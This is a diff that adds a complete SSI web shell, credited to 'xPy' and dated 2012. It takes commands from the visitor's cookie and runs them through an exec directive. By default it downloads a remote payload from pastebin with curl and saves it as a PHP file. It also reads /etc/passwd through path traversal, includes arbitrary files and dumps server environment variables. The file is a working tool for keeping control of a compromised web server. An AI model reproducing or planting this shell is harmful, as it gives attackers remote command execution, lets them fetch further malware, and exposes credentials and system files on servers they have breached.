@@ -1,0 +1,89 @@
+<!--#config errmsg="[Error in shell]"--> 
+<!--#config sizefmt="bytes"--> 
+
+<!--#if expr="(\"$HTTP_COOKIE\" = \"\") || (\"$REQUEST_METHOD\" != \"GET\")" --> 
+    <!--#set var="shl" value="curl http://pastebin.com/raw/75S57gYW -o asu.php" --> 
+<!--#else --> 
+    <!--#set var="shl" value=$HTTP_COOKIE --> 
+<!--#endif --> 
+
+<!--#if expr="(\"$HTTP_COOKIE\" = \"\") || (\"$REQUEST_METHOD\" != \"POST\")" --> 
+    <!--#set var="inc" value="/../../../../../../../etc/passwd" --> 
+<!--#else --> 
+    <!--#set var="inc" value=$HTTP_COOKIE --> 
+<!--#endif --> 
+
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+<html lang="en-US" xmlns="http://www.w3.org/1999/xhtml" prefix="og: http://ogp.me/ns#"> 
+<head> 
+<title> 
+SSI Web Shell edit by xPy
+</title>
+<meta name="robots" content="noindex" />
+<meta name="viewport" content="width=device-width, initial-scale=1.0" />
+<meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+<script language="javascript"> 
+function doit( mode ) { 
+    if( document.cookie != "" ) { 
+        var cookies = document.cookie.split( ";" ); 
+        for( var i = 0; i < cookies.length; ++i )  
+            document.cookie = cookies[ i ] + ";expires=Thu, 01 Jan 1970 00:00:00 GMT"; 
+    } 
+    document.cookie = document.getElementById( mode ).value; 
+    document.location.reload(); 
+} 
+function toggle( id ) { 
+    document.getElementById( id ).style.display = (document.getElementById( id ).style.display == "none") ? "block" : "none"; 
+} 
+</script>
+</head> 
+<body bgcolor=#e4e0d8 alink=blue vlink=blue> 
+<div align=center width=100% border=0 style=background-color:#D4D0C8;> 
+<center><b><font size=+2><a href=http://wWw.xPy.VN>SSI Web Shell</a></font></b></center> 
+</div><br> 
+<div align=left width=100% border=0 style=background-color:#D4D0C8;> 
+<center><b><u><font size=+1 onclick=toggle('inf'); style=cursor:hand;>Common info</font></u></b></center> 
+<div id=inf style=display:none;><br> 
+<b><font color=blue>FILE NAME</font></b>:&nbsp;&nbsp;&nbsp;<b><!--#echo var=DOCUMENT_NAME --></b><br> 
+<b><font color=blue>FILE URL</font></b>:&nbsp;&nbsp;&nbsp;<b><!--#echo var=DOCUMENT_URI --></b><br> 
+<b><font color=blue>Owner</font></b>:&nbsp;&nbsp;&nbsp;<b><!--#echo var=USER_NAME --></b><br> 
+<br></div> 
+</div> 
+<br> 
+<div align=left width=100% border=0 style=background-color:#D4D0C8;> 
+<center><b><u><font size=+1 onclick=toggle('env'); style=cursor:hand;>Enviroment info</font></u></b></center> 
+<div id=env style='display:none;'><br> 
+<pre> 
+<!--#printenv--> 
+</pre> 
+<br></div> 
+</div> 
+<br> 
+<div align=left width=100% border=0 style=background-color:#D4D0C8;> 
+<center><b><u><font size=+1 onclick=toggle('shl'); style=cursor:hand;>Command for shell</font></u></b></center></div> 
+<div align=left width=100% border=0 id=shl style=background-color:#D4D0C8;<!--#if expr="\"$REQUEST_METHOD\" != \"GET\"" -->display:none;<!--#endif -->> 
+<br><b><font color=blue>Enter command</font></b>:&nbsp;&nbsp;&nbsp;<form method=get onsubmit=doit('command');><input type=text size=80 id=command>&nbsp;<input type=submit value=Run></form><br> 
+<center><b><font size=+1>Result</font></b></center> 
+<br> 
+<b><font color=blue>Executed command</font></b>:&nbsp;&nbsp;&nbsp;<b><!--#echo var=shl --></b><br> 
+<textarea bgcolor=#e4e0d8 cols=121 rows=15> 
+<!--#exec cmd=$shl --> 
+</textarea> 
+</div> 
+<div align=left width=100% border=0 style=background-color:#D4D0C8;> 
+<center><b><u><font size=+1 onclick=toggle('inc'); style=cursor:hand;>Operations on files</font></u></b></center> 
+<div id=inc <!--#if expr="\"$REQUEST_METHOD\" != \"POST\"" -->style=display:none;<!--#endif -->><br> 
+<b><font color=blue>View file (virtual include)</font></b>:&nbsp;&nbsp;&nbsp;<form method=post onsubmit=doit('vfile');><input type=text size=80 id=vfile>&nbsp;<input type=submit value=Run></form><br> 
+<b><font color=blue>Included file</font></b>:&nbsp;&nbsp;&nbsp;<b><!--#echo var=inc --></b><br> 
+<b><font color=blue>Size</font></b>:&nbsp;&nbsp;&nbsp;<b><!--#fsize virtual=$inc -->&nbsp;bytes</b><br> 
+<textarea bgcolor=#e4e0d8 cols=121 rows=15> 
+<!--#include virtual=$inc --> 
+</textarea> 
+<br></div> 
+</div> 
+<br> 
+<div align=center width=100% border=0 style=background-color:#D4D0C8;> 
+<center><b><font size=+1><a href=http://wWw.xPy.VN>(c) xPy</a></font></b><br><small>2012, v1.0</small></center> 
+</div> 
+</body> 
+</html>
